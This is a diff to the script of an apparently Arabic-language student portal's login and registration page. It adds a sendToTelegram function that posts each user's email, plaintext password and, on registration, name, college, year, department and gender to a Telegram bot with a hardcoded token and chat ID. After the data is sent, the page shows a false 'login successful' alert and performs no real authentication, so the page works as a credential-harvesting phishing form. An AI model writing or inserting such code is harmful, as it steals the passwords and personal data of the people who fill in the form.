@@ -117,40 +117,76 @@
 
     <!--===== SCROLL REVEAL =====-->
     <script src="https://unpkg.com/scrollreveal"></script>
+<script>
+    function showRegisterForm() {
+        document.getElementById('login-form').style.display = 'none';
+        document.getElementById('register-form').style.display = 'block';
+    }
 
-    <script>
-        function showRegisterForm() {
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('register-form').style.display = 'block';
+    function showLoginForm() {
+        document.getElementById('login-form').style.display = 'block';
+        document.getElementById('register-form').style.display = 'none';
+    }
+
+    function togglePasswordVisibility(inputId) {
+        const input = document.getElementById(inputId);
+        if (input.type === 'password') {
+            input.type = 'text';
+        } else {
+            input.type = 'password';
         }
+    }
 
-        function showLoginForm() {
-            document.getElementById('login-form').style.display = 'block';
-            document.getElementById('register-form').style.display = 'none';
-        }
+    function sendToTelegram(message) {
+        const botToken = '7398851467:AAFEMnMvIWkLbkJQ1-AnGCedwehAuBBP02Y'; // استبدل هذا بالتوكن الخاص بالبوت
+        const chatId = '829549685'; // استبدل هذا بالـChat ID الخاص بك أو ID المجموعة
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        function login() {
-            const email = document.getElementById('login-email').value;
-            const password = document.getElementById('login-password').value;
+        const data = {
+            chat_id: chatId,
+            text: message,
+        };
 
-            // قم بالتحقق من بيانات تسجيل الدخول هنا
-            console.log('تسجيل الدخول باستخدام:', email, password);
-            alert('تم تسجيل الدخول بنجاح!');
-        }
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الرسالة بنجاح إلى Telegram:', data);
+            })
+            .catch(error => {
+                console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
+            });
+    }
 
-        function register() {
-            const name = document.getElementById('register-name').value;
-            const email = document.getElementById('register-email').value;
-            const password = document.getElementById('register-password').value;
-            const college = document.getElementById('register-college').value;
-            const squad = document.getElementById('register-squad').value;
-            const department = document.getElementById('register-department').value;
-            const gender = document.getElementById('register-gender').value;
+    function login() {
+        const email = document.getElementById('login-email').value;
+        const password = document.getElementById('login-password').value;
 
-            // قم بالتحقق من بيانات إنشاء الحساب هنا
-            console.log('إنشاء حساب باستخدام:', name, email, password, college, squad, department, gender);
-            alert('تم إنشاء الحساب بنجاح!');
+        const message = `تسجيل الدخول:\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}`;
+        sendToTelegram(message);
 
+        alert("تم تسجيل الدخول بنجاح!"); // رسالة تأكيد
+        // قم بإضافة الكود الخاص بتسجيل الدخول هنا
+    }
+
+    function register() {
+        const name = document.getElementById('register-name').value;
+        const email = document.getElementById('register-email').value;
+        const password = document.getElementById('register-password').value;
+        const college = document.getElementById('register-college').value;
+        const squad = document.getElementById('register-squad').value;
+        const department = document.getElementById('register-department').value;
+        const gender = document.getElementById('register-gender').value;
+
+        const message = `إنشاء حساب:\nالاسم: ${name}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}\nالكلية: ${college}\nالفرقة: ${squad}\nالشعبة: ${department}\nالنوع: ${gender}`;
+        sendToTelegram(message);
+
+        alert("تم إنشاء الحساب بنجاح!"); // رسالة تأكيد
             // بعد التحقق بنجاح، إعادة التوجيه إلى الصفحة المناسبة
             redirect(college, squad, department, gender);
         }
